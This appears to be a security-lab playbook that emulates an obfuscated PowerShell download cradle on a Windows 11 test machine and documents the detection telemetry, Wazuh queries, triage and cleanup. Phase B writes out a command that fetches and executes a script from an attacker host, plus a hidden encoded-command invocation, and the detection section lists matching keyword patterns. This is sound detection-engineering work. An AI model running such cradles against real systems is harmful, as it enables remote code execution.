# SIM-03 — Suspicious PowerShell Execution

| | |
|---|---|
| **ID** | SIM-03 |
| **ATT&CK** | T1059.001 Command and Scripting Interpreter: PowerShell · T1105 Ingress Tool Transfer · T1140 Deobfuscate/Decode |
| **Tactic** | Execution |
| **Attacker** | Kali Linux `192.168.1.8` (payload host) → executed on `192.168.1.11` |
| **Target** | Windows 11 `192.168.1.11` |
| **Detection rules** | `100110` (suspicious PowerShell) |
| **Status** | ☐ Planned → ☐ Executed → ☐ Documented |
| **Date performed** | YYYY-MM-DD |

## Objective

Emulate the single most common initial-execution technique in real intrusions: **obfuscated
PowerShell with a download cradle**. Show the full chain in telemetry: encoded command →
download from attacker-controlled host → in-memory execution — and detect it with Sysmon
process creation + PowerShell script block logging.

## Scope & Safety

- Payload is **benign by design**: a text file containing `Write-Output "lab payload executed"`
  served from Kali's Python HTTP server. No real malware, no real C2.
- Optional benign marker: launch `calc.exe` as the "payload" instead of anything harmful.

## Prerequisites

- [ ] Sysmon installed (EID 1 active) and PowerShell logging enabled (see [`../configs/sysmon-config-notes.md`](../configs/sysmon-config-notes.md))
- [ ] Rule `100110` installed
- [ ] Kali reachable from the endpoint (`ping 192.168.1.8` works)

---

## 1. Attack Execution

### Phase A — Stage the benign payload on Kali

```bash
echo 'Write-Output "lab payload executed"' > /tmp/payload.txt
cd /tmp && python3 -m http.server 8000
```

### Phase B — Obfuscated download cradle on the endpoint

On `192.168.1.11`, as `testuser`, in PowerShell:

```powershell
# Classic download cradle (the pattern detections are written against)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8:8000/payload.txt')

# Encoded command variant (base64 of a harmless Write-Output)
powershell -nop -w hidden -enc <base64-of-Write-Output-command>
```

How to produce the encoded string (also useful talking-point material):

```powershell
$cmd = 'Write-Output "lab payload executed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```

📸 Screenshot: `screenshots/07a_powershell_cradle.png` — terminal showing the cradle + output.

## 2. Expected Telemetry

| Step | Source | Event | Field evidence |
|------|--------|-------|----------------|
| PowerShell starts | Sysmon EID 1 | `powershell.exe` | `image`, `commandLine`, `parentImage`, `user` |
| Encoded/hidden flags | Wazuh rule **`100110`** | alert | `commandLine` contains `-enc` / `hidden` / `downloadstring` |
| Script decoded | PowerShell 4104 | script block text | the decoded `Write-Output` line (great evidence!) |
| Outbound fetch | Sysmon EID 3 (optional) | network connection | dst `192.168.1.8:8000` |

📸 Screenshots:
- `screenshots/07b_sysmon_eid1_powershell.png` — Sysmon Event 1 with the suspicious command line
- `screenshots/07_powershell_alert.png` — Wazuh rule `100110` firing

## 3. Detection

Queries (see [`../queries/execution.md`](../queries/execution.md)):

```
rule.id : 100110
```

```
data.win.eventdata.commandLine : (*downloadstring* or *-enc* or *hidden*)
```

```
data.win.eventdata.image : *powershell* AND agent.name : WIN11-PRO
```

## 4. Triage Walkthrough

1. Open the alert → copy `commandLine`, `parentImage`, `user`.
2. Decode any `-enc` payload (base64 → UTF-16LE) and paste the decoded text into the ticket.
3. Process tree: who launched PowerShell? (`cmd.exe` self-start vs `winword.exe` macro matters)
4. Network pivot: any connection to `192.168.1.8:8000` around the timestamp? (Sysmon EID 3)
5. Scope: any other hosts running similar command lines? (`data.win.eventdata.commandLine : *192.168.1.8*`)
6. Contain: kill the PowerShell process, block the URL/IP at the firewall, hunt for the same cradle elsewhere.

## 5. Response & Cleanup

```powershell
# Stop any running payload processes
Stop-Process -Name powershell -Force
# Remove the staged payload on Kali
rm /tmp/payload.txt
```

- [ ] Confirm no Run-key/task was created (SIM-03 should leave none)
- [ ] Record end of the test window

## 6. Evidence Checklist

- [ ] `07a_powershell_cradle.png`
- [ ] `07b_sysmon_eid1_powershell.png`
- [ ] `07_powershell_alert.png` (Wazuh `100110`)

## 7. Lessons / Tuning Notes *(fill after execution)*

- Which substring produced the match? (good for explaining rule precision in interviews)
- What would break this detection? (e.g. `powershell -ep bypass` + IEX with no flagged token —
  document the gap and the fix you'd propose)
